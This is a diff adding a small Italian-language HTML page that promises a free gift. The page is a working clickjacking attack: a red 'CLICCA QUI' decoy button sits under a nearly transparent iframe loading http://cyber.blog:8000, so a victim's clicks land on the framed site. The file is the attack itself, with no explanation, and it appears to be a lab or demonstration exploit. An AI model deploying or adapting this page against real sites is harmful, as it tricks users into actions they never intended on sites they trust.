@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Free Gift</title>
+
+    <style>
+        body{
+            text-align:center;
+            font-family:Arial;
+            margin-top:50px;
+        }
+
+        .container{
+            position:relative;
+            width:800px;
+            height:600px;
+            margin:auto;
+        }
+
+        iframe{
+            position:absolute;
+            top:0;
+            left:0;
+            width:800px;
+            height:600px;
+            opacity:0.1;
+            z-index:2;
+        }
+
+        .fake-button{
+            position:absolute;
+            top:300px;
+            left:300px;
+            z-index:1;
+            padding:20px;
+            font-size:30px;
+            background:red;
+            color:white;
+            border:none;
+            cursor:pointer;
+        }
+    </style>
+</head>
+
+<body>
+
+<h1>🎁 Vinci un regalo gratis 🎁</h1>
+
+<div class="container">
+
+    <button class="fake-button">
+        CLICCA QUI
+    </button>
+
+    <iframe src="http://cyber.blog:8000"></iframe>
+
+</div>
+
+</body>
+</html>
